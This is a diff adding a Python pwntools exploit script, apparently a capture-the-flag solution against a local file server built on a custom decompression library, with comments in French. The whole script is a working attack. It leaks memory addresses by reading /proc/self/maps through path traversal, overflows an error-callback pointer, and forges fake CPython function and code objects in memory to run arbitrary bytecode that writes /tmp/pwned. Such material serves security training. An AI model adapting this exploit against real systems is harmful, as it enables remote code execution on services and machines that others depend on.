@@ -1,0 +1,203 @@
+#!/usr/bin/env python3
+
+from pwn import *
+import base64
+import dis
+
+context.log_level = 'error'
+context.binary = elf = ELF('/usr/bin/python3')
+context.terminal = ['tmux', 'splitw', '-h']
+
+HOST = "127.0.0.1"
+PORT = 1337
+
+gs = """
+continue
+"""
+if not args.REMOTE:
+    server = gdb.debug([elf.path, '../chall.py'], gdbscript=gs) if args.GDB else process([elf.path, '../chall.py'])
+
+def get_conn():
+    if args.REMOTE:
+        return remote(HOST, PORT)
+    else:
+        return remote("127.0.0.1", 1337)
+
+context.log_level = 'info'
+
+# wait for server to wake
+if args.GDB:
+    input("enter when gdb is ready")
+else:
+    sleep(0.1)
+
+io = get_conn()
+
+io.sendline(b'RETR /proc/self/maps')
+io.recvuntil(b'OK\n')
+
+# ===== EXTRACT LEAKS FROM PATH TRAVERSAL =====
+data = base64.b64decode(io.recvline())
+grab_next = False
+leak_obj = 0
+leak_lib = 0
+for line in data.split(b'\n'):
+    if leak_lib == 0 and b'cool_compress.so' in line:
+        leak_lib = int(line[:line.index(b'-')], 16) 
+
+    if grab_next:
+        leak_obj = int(line[:line.index(b'-')], 16)
+        grab_next = False
+
+    if b'heap' in line:
+        grab_next = True
+
+# =============================================
+
+info("object base @ " + hex(leak_obj))
+info("compress lib @ " + hex(leak_lib))
+
+# On peut calculer la position de l'array utilisée pour les calculs où notre overflow apparaît à partir du leak
+ptr_arr = leak_lib + 0x41a0
+
+# On va overflow exactement le pointeur err_callback pour le rediriger vers le début de notre buffer pour créer
+# une fausse structure type PyObject
+
+payload = b"\xffA"*32 + b'\x20B'
+for b in pack(ptr_arr):
+    payload += b'\x01' + b.to_bytes()
+payload = base64.b64encode(payload)
+
+io.sendline(b'PUT payload.cc ' + payload)
+io.sendline(b'DCMPR payload.cc')
+
+# A partir de maintenant, err_callback a été écrasé par l'addresse de notre buffer
+# Il suffit donc de créer une structure d'objet python valide qui correspond à une fonction pour exécuter le bytecode
+
+func_globals = leak_obj + 0x1ff850
+func_builtins = leak_obj + 0x1ff850
+vectorcall = 0x5a5c30
+bytecode = bytes.fromhex("95005b0111000000000000005301350111000000000020006700")
+script = b"open('/tmp/pwned','w').write('ok')"
+
+PyNone = 0xa15510
+PyUnicode_Type = 0xa13ba0
+PyFunction_Type = 0xa0ae20
+PyCode_Type = 0xa148a0
+PyTuple_Type = 0xa13a00
+
+info("__globals__ @ " + hex(func_globals))
+info("__builtins__ @ " + hex(func_builtins))
+info("vectorcall @ " + hex(vectorcall))
+
+payload_pad = (8 - len(script) % 8) % 8
+
+payload = flat({
+    # Partie 1 : Fake PyFunctionObject
+    # On créer un objet valide qui trigger un vectorcall et redirige vers une instance de 
+    # PyCodeObject définie plus loins dans la mémoire (ptr_arr + 0x100) dans le but d'exécuter un bytecode
+    # python custom
+    0: [
+        0x3fff, PyFunction_Type, # function type
+        func_globals, 
+        func_builtins, 
+        ptr_arr + 0x400, 
+        ptr_arr + 0x400, 
+        ptr_arr + 0x100,
+        0, 0, 0, # stay null
+        0xa15510, # Py_None
+        0, 0, # stay null
+        0xa56658, 
+        0, 0, # stay null
+        vectorcall, # null vectorcall to avoid using vectorcall !
+        p32(0x321), p32(0)
+    ], 
+    0x100: [
+        0x3fff,        PyCode_Type,       # ob_refcnt, PyCode_Type
+        13,                         # ob_size = 13 instructions
+
+        ptr_arr + 0x200,            # co_consts  ← fake tuple
+        ptr_arr + 0x300,            # co_names   ← fake tuple ("exec",)
+        0xa51c30,                   # co_exceptiontable = static b""
+
+        p32(0x3),   p32(1),         # co_flags=3, co_argcount=1
+        p32(0),     p32(0),         # co_posonlyargcount=0, co_kwonlyargcount=0
+        p32(3),     p32(0xae),         # co_stacksize=3, co_firstlineno=1
+
+        p32(1),     p32(13),        # co_nlocalsplus=0, co_framesize=13
+        p32(1),     p32(0),         # co_nlocals=0, co_ncellvars=0
+        p32(0),     p32(0x321),         # co_nfreevars=0, co_version=0
+
+        0,                          # co_localsplusnames = NULL ✅
+        0,                          # co_localspluskinds = NULL ✅
+        ptr_arr + 0x400,            # co_filename = NULL (ok if no exception)
+        ptr_arr + 0x400,            # co_name    = NULL
+        ptr_arr + 0x400,            # co_qualname= NULL
+        0xa51c30,                   # co_linetable= NULL (ok if no exception)
+        0, 0, 0, 0, 0,              # co_weakreflist..co_monitoring = NULL
+        p32(0) + p32(0),            # _co_firsttraceable=0, pad
+        0,                          # co_extra = NULL
+
+        bytecode                    # co_code_adaptive INLINE
+    ],
+    # Fake Consts
+    0x200: [
+        0x3fff, PyTuple_Type, # tuple object 
+        0x2, 
+        PyNone,
+        ptr_arr + 0x500
+    ], 
+    # Fake Names
+    0x300: [
+        0x3fff, PyTuple_Type, # tuple object
+        0x1, 
+        ptr_arr + 0x400
+    ],
+    # "exec"
+    0x400: [
+        0x3fff, PyUnicode_Type, 
+        4, p64(0xffffffffffffffff),
+        p8(0xe4), b'\x00'*7,
+        b'exec', b'\x00'*4
+    ],
+    # python exec string arg
+    0x500: [
+        0x3fff, PyUnicode_Type,
+        len(script), p64(0xffffffffffffffff),
+        p8(0xe4), b'\x00'*7,
+        script + b'\x00' + payload_pad*b'\x00'
+    ]
+}, filler=b'\x00')
+
+def compress(data: bytes):
+    res = b""
+    prev = data[0]
+    count = 1
+    for i in range(1, len(data)):
+        if prev == data[i] and count < 255:
+            count += 1
+        else:
+            res += count.to_bytes()
+            res += prev.to_bytes()
+            count = 1
+            prev = data[i]
+
+    res += count.to_bytes()
+    res += prev.to_bytes()
+    return res
+
+
+payload = base64.b64encode(compress(payload))
+
+io.sendline(b'PUT test.cc ' + payload)
+io.sendline(b'DCMPR test.cc')
+
+input("waiting for trigger")
+
+io.sendline(b'PUT trigger.cc YQ==')
+io.sendline(b'DCMPR trigger.cc')
+io.sendline(b'QUIT')
+
+if server:
+    server.interactive()
+    server.close()
